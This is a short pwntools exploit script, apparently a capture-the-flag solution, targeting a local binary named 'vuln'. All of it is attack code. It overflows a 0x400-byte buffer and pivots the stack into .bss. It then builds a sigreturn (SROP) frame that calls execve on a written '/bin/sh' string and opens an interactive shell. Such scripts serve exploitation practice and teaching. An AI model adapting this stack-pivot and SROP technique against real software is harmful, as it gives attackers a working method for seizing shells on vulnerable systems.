from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

bss = 0x403500
read = 0x401037
syscall = 0x401063

# io = gdb.debug("./vuln", "b *0x401063\nc")
io = process("./vuln")
io.recvuntil(b"say? ")
io.send(
    b"a" * 0x400 + p64(bss + 0x400) + p64(read)
)  # when leave; ret, it will return to read
binsh = bss - 0x8 - 0x400

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

rop = p64(syscall) + bytes(frame)
rop += (0x400 - len(rop)) * b"a"
assert len(rop) == 0x400
io.send(rop + p64(bss - 8) + p64(read))
io.send(
    b"/bin/sh\0" + b"a" * (15 - 8 - 4) + b"peko"
)  # will be written to bss - 0x8 - 0x400
io.recvuntil(b"peko")
io.interactive()
